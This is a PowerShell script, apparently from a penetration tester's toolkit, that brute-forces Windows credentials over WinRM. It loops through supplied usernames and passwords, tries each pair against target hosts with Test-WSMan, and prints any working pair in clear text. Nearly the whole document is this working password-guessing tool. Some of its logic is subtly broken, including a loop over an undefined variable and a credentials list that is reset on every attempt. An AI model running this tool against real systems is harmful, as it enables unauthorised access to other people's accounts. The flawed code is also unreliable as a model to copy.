<#
.SYNOPSIS
This cmdlet was created to brute force credentials using WinRM


.DESCRIPTION
Brute force credentials of a user or list of users and a password or list of passwords on a remote or local device


.PARAMETER ComputerName
This parameter defines a single remote device or list of remote devices to test credentials against

.PARAMETER Username
This parameter defines a single username or a list of usernames against the passwords you define

.PARAMETER UserFile
This parameter defines a file containing a list of usernames

.PARAMETER Passwd
This parameter defines a single password to test against the users you define

.PARAMETER PassFile
This parameter defines a file containng a list of passwords


.NOTES
Author: Robert H. Osborne
Alias: tobor
Contact: rosborne@osbornepro.com


.LINK
https://roberthsoborne.com
https://osbornepro.com
https://github.com/tobor88
https://gitlab.com/tobor88
https://www.powershellgallery.com/profiles/tobor
https://www.linkedin.com/in/roberthosborne/
https://www.youracclaim.com/users/roberthosborne/badges
https://www.hackthebox.eu/profile/52286


.INPUTS
System.String, System,Array


.OUTPUTS
PSCustomObject
		
#>
Function Test-BruteForceCredentials.ps1 {
    [CmdletBinding()]
        param(
            [Parameter(
                Mandatory=$False,
                ValueFromPipeline=$True,
                ValueFromPipelineByPropertyName=$False
            )]  # End Parameter
            [String[]]$ComputerName,

            [Parameter(
                ParameterSetName="Username",
                Mandatory=$True
            )]  # End Parameter
            [Parameter(
                ParameterSetName="Password",
                Mandatory=$True
            )]  # End Parameter
            [Parameter(
                ParameterSetName="PassFile",
                Mandatory=$True
            )]  # End Parameter
            [String[]]$Username,

            [Parameter(
                ParameterSetName="UserFile",
                Mandatory=$True
            )]  # End Parameter
            [Parameter(
                ParameterSetName="Password",
                Mandatory=$True
            )]  # End Parameter
            [Parameter(
                ParameterSetName="PassFile",
                Mandatory=$True
            )]  # End Parameter
            [String]$UserFile,

            [Parameter(
                ParameterSetName="UserFile",
                Mandatory=$True
            )]  # End Parameter
            [Parameter(
                ParameterSetName="Username",
                Mandatory=$True
            )]  # End Parameter
            [Parameter(
                ParameterSetName="Password",
                Mandatory=$True
            )]  # End Parameter
            [String[]]$Passwd,

            [Parameter(
                ParameterSetName="UserFile",
                Mandatory=$True
            )]  # End Parameter
            [Parameter(
                ParameterSetName="Username",
                Mandatory=$True
            )]  # End Parameter
            [Parameter(
                ParameterSetName="PassFile",
                Mandatory=$True
            )]  # End Parameter
            [String]$PassFile)  # End param


    Switch ($PSBoundParameters.Keys)
    {

        'Username' {

            Write-Verbose "Username ParameterSet being used"

            [array]$UserList = $Username

        }  # End Username Switch

        'UserFile' {

            Write-Verbose "UserFile ParameterSet being used"

            $UserList = Get-Content -Path $UserFile
            ForEach ($User in $UserList) 
            {
            
                $UserList += $User
        
            }  # End ForEach
            

        }  # End UserFile Switch

        'Password' {

            Write-Verbose "Passwd ParameterSet being used"

            [array]$PassList = $Passwd

        }  # End Password Switch

        'PassFile' {

            Write-Verbose "PassFile ParameterSet being used"
            
            $PassList = Get-Content -Path $PassFile
            ForEach ($P in $passwordstotry) 
            {
            
                $Passwd += $p 
            
            }  # End ForEach


        }  # End PassFile Switch

    }  # End Switch

    ForEach ($U in $UserList) 
    {

        ForEach ($P in $PassList) 
        {
              
            $Error.Clear()
        
            $Credentials = @()
            $ClearTextPassword = ""
          
            $SecurePassword = ConvertTo-SecureString -String $P -AsPlainText -Force
            $AttemptCredentials = New-Object -TypeName System.Management.Automation.PSCredential($U, $SecurePassword)
                
            $Result = Test-WSMan -ComputerName $ComputerName -Credential $AttemptCredentials -Authentication Negotiate -ErrorAction SilentlyContinue
        
        
           If ($Null -eq $Result) 
           {
        
                Write-Output "Testing Password: $p = Failed"
                
                $ClearTextPassword = $Null
        
            }  # End If 
            Else 
            {
        

                $Credentials += "USER: $U`n PASS: $P`n"

                Write-Output "SUCCESS: `n$Credentials`n"
                
            }  # End Else       
        
        } # ForEach

    }  # End ForEach

    If ($Null -eq $Credentials) 
    {

        Write-Output "None of the define passwords were found to be correct"

    }  # End Else

}  # End Function Test-BruteForceCredentials
